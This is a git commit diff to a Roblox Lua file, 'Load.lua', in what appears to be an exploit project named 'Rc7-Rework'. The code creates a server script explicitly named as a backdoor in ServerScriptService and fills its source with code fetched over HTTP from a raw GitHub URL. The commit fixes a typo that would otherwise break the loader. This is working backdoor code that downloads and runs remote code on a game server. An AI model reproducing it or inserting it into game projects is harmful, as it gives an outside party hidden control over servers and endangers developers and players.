d0eb692d3084ea8fcdb00a2ca2750ae752f66460
Oflice <ofliceofficial@gmail.com>
2025-01-12 20:25:50 +0200

    Update Load.lua

--- Load.lua
+++ Load.lua
@@ -6,7 +6,7 @@ remoteof.Parent = game:GetService("ReplicatedStorage")
 
 local scrurl = "https://raw.githubusercontent.com/Oflice/Rc7-Rework/refs/heads/main/Files/Script.lua"
 
-local Script = instance.new("Script")
+local Script = Instance.new("Script")
 Script.Name = "XX__RC7__XX__SCRIPT_MAIN__BACKDOOR_cx"
 Script.Parent = game:GetService("ServerScriptService")
 Script.Source = HttpService:GetAsync(scrurl)
